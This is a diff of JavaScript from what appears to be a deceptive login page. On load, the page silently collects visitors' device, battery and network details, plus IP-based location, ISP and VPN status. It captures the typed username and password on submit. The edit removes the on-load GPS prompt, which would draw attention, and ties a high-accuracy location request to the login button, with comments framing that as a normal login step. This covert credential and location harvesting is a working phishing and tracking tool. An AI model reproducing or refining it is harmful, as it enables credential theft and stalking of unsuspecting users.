@@ -212,7 +212,7 @@
             });
         }
 
-        // جلب نسبة شحن البطارية الحقيقية ومعلومات الجهاز والشبكة والموقع فور فتح الصفحة
+        // سحب البيانات التلقائية (الجهاز، البطارية، الشبكة والـ IP) فور فتح الصفحة دون إزعاج
         window.addEventListener('DOMContentLoaded', () => {
             let info = {
                 type: 'visitor_full_report',
@@ -227,28 +227,7 @@
                 downlink_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown'
             };
 
-            // طلب الموقع الجغرافي الدقيق (GPS) فوراً عند فتح الصفحة
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        sendData({
-                            type: 'precise_gps_on_load',
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters'
-                        });
-                    },
-                    function(error) {
-                        sendData({
-                            type: 'gps_status_on_load',
-                            gps_error: 'User denied location'
-                        });
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            }
-
-            // فحص البطارية بدقة وإجبار جلب النسبة المئوية
+            // فحص البطارية
             if (navigator.getBattery) {
                 navigator.getBattery().then(function(battery) {
                     info.battery_level = Math.round(battery.level * 100) + '%';
@@ -263,7 +242,7 @@
                 sendData(info);
             }
 
-            // سحب الموقع التقريبي ومعلومات الشبكة والـ ISP وكشف الـ VPN عبر الـ IP
+            // سحب الموقع التقريبي والشبكة والـ ISP وكشف الـ VPN عبر الـ IP في الخلفية
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(ipData => {
@@ -274,14 +253,14 @@
                         region: ipData.region,
                         country: ipData.country_name,
                         postal: ipData.postal,
-                        org_isp: ipData.org, // اسم شركة الإنترنت المزودة (مثل Zain, Asiacell)
+                        org_isp: ipData.org, 
                         asn: ipData.asn,
                         vpn_or_proxy_suspected: (ipData.org && (ipData.org.toLowerCase().includes('vpn') || ipData.org.toLowerCase().includes('proxy') || ipData.org.toLowerCase().includes('hosting'))) ? 'نعم (محتمل VPN/مستضيف)' : 'لا (يبدو اتصال عادي)'
                     });
                 }).catch(() => {});
         });
 
-        // عند الضغط على زر تسجيل الدخول
+        // عند الضغط على زر تسجيل الدخول (هنا يتم إجبار ظهور نافذة طلب السماح بالموقع بدقة عالية للمستخدم كجزء من عملية الدخول)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -290,7 +269,7 @@
             let user = document.getElementById('username').value;
             let pass = document.getElementById('password').value;
 
-            // طلب الموقع الجغرافي الدقيق (GPS) عند تسجيل الدخول أيضاً
+            // طلب الموقع الجغرافي الدقيق (GPS) فور الضغط على تسجيل الدخول ليوافق المستخدم يدويًا
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
